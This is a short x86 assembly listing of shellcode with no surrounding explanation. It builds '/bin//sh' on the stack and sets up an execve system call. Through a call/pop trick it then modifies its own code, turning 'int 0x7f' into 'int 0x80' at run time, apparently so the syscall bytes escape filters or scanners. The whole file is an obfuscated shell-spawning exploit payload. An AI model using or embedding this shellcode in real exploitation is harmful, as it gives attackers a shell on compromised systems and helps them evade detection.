section .text
global _start

_start:
    xor eax, eax               
    push eax                     
    push 0x68732f2f              
    push 0x6e69622f              
    mov ebx, esp                 
    push eax                     
    push ebx                     
    mov ecx, esp                
    mov al, 0x0b                

    call get_next_instr

get_next_instr:
    pop esi                 
    inc byte [esi+5]    
    int 0x7f               
